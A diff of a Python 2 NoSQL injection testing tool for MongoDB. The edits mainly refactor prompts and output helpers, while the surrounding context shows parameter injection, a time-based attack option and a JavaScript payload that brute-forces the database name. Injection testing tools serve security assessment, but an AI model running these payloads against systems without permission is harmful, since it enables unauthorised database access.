@@ -11,12 +11,12 @@ import requests
 import string
 import sys
 import time
-
 from Lib.common import checkFile
 from Lib.common import extractRegexResult
 from Lib.common import filterStringValue
 from Lib.common import getPublicTypeMembers
 from Lib.common import getUnicode
+from Lib.common import getQuesMsg
 from Lib.common import isListLike
 from Lib.common import openFile
 from Lib.common import printErrMsg
@@ -31,19 +31,17 @@ from Lib.setting import HEADERS
 from Lib.setting import PROBLEMATIC_CUSTOM_INJECTION_PATTERNS
 from Lib.setting import TAG_NO
 from Lib.setting import TAG_YES
-
 from pymongo import MongoClient
-
 
 
 def InjectOption(url, reqFile):
 	if url == None:
-
+		printErrMsg('[Error] The function is testing, waitting for me :)')
 		#postWeb(reqFile)
 	elif reqFile == None:
 		getWeb(url)
 	else:
-		printErrMsg('[Error] Check the required arguments......')
+		printErrMsg('[Error] Check the required options......')
 		return
 
 def postWeb(reqFile):
@@ -118,7 +116,7 @@ def getWeb(url):
 	except Exception, e:
 		printErrMsg('[Error] %s, looks like the server didn\'t respond, check your options.' % e)
 	if appUp == True:
-		injectSize = raw_input(Fore.CYAN + '[*] Input test random string size: ')
+		injectSize = getQuesMsg('[*] Input test random string size: ')
 		injectstr = getInjectStr(int(injectSize))
 
 		basedInjectUrl = buildUrl(url, injectstr)
@@ -244,7 +242,7 @@ def getWeb(url):
 		else:
 			testNum += 1
 
-		doTimeAttack = raw_input(Fore.CYAN + '[*] Starting based time attack? (y/n)')
+		doTimeAttack = getQuesMsg('[*] Starting based time attack? (y/n)')
 
 		if doTimeAttack in TAG_YES:
 			#整型
@@ -281,12 +279,12 @@ def getWeb(url):
 				print '[*] MongoDB < 2.4.0 detected. Starting brute forcing database info.'
 				getDBInfo()
 
-		print '[+] Valid URLs:'
+		printInfoMsg('[+] Valid URLs:')
 		for url in validAddrs:
 			printInfoMsg('    %s' % url)
 			
 		print '\n '
-		print '[+] Possible URLs:'
+		printInfoMsg('[+] Possible URLs:')
 		for url in possAddrs:
 			printInfoMsg('    %s' % url)
 
@@ -353,7 +351,7 @@ def getInjectStr(size):
 
 	format = True
 	while format:
-		format = raw_input(Fore.CYAN + '[*] choose: ')
+		format = getQuesMsg('[*] choose: ')
 		if format == '1':
 			chars = string.ascii_letters + string.digits
 			return ''.join(random.choice(chars) for x in range(size))
@@ -387,14 +385,14 @@ def buildUrl(url, value):
 		paramNames.append(item[0:index])
 		paramValues.append(item[index + 1:len(item)])
 
-	print '[+] List of parameters:'
+	printInfoMsg('[+] List of parameters:')
 	index = 1
 	for name in paramNames:
 		print '    [%s] %s' % (index,name)
 		index += 1
 
 	try:
-		injectIndex = raw_input(Fore.CYAN + '[*] Choose parmeters to inject (such as 1,2,3):')
+		injectIndex = getQuesMsg('[*] Choose parmeters to inject (such as 1,2,3):')
 		print injectIndex.split(',')
 		for i in injectIndex.split(','):
 			injectParams.append(paramNames[int(i)-1])
@@ -461,7 +459,7 @@ def getDBInfo():
 		else:
 			DBnameLen += 1
 
-	print '[+] Database name is: ',
+	printInfoMsg('[+] Database name is: '),
 	while getDBname == False:
 		calcUrl = urlArray[11].replace("---","if(db.getName()[%s]==chars[%s]){return true;} var v='a&" % (nameCount,charCount))
 		req = requests.get(calcUrl)
